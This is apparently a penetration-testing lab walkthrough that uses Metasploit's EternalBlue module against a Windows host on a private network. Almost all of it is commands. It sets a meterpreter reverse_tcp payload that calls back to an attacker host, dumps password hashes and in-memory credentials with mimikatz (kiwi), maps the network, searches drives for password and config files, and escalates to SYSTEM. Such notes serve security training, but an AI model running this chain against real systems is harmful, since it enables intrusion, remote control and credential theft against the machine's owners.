
# Credentials:

```
msfconsole
```


```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.57.20
set RHOST 192.168.57.20
```
![metasploit-setting](metasploit-setting.png)


```
set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LHOST  192.168.57.10
set LPORT 4444

set GroomAllocations 12
set GroomDelta 5
set MaxExploitAttempts 3
set ProcessName spoolsv.exe

show options
show advanced
```
![metaspoloit-setting-attacker](metaspoloit-setting-attacker.png)
![metasploit-setting-advanced](metasploit-setting-advanced.png)

```
check
exploit
```
![metasploit-exploit](metasploit-exploit.png)


```
sessions -i 1
sysinfo
getuid
run post/windows/gather/checkvm
getpid

hashdump
loot
```
![metasploit-info-victim](metasploit-info-victim.png)

# mimikatz for in-memory credentials

```
load kiwi
creds_all
lsa_dump_sam
```
![metasploit-credentials-info-1](metasploit-credentials-info-1.png)

```
ipconfig
arp
```
![metasploit-credentials-info-2](imetasploit-credentials-info-2.png)


```
netstat -ano
```
![metasploit-credentials-info-3](metasploit-credentials-info-3.png)


```
route
```
![metasploit-credentials-info-4](metasploit-credentials-info-4.png)

# Guardar en archivo
```
shell

# Buscar archivos interesantes
search -f *.txt -d C:\\Users
search -f *.pdf -d C:\\
search -f *.doc* -d C:\\Users
search -f *password* -d C:\\
search -f *config* -d C:\\
```
![metasploit-documents-1](metasploit-documents-1.png)
![metasploit-documents-2](metasploit-documents-2.png)


## Privileges escalation

```
getsystem

use post/windows/escalate/getsystem
run

# migrate to a process with privileges
ps
migrate 492

```
![mestasploit-services-1](mestasploit-services-1.png)

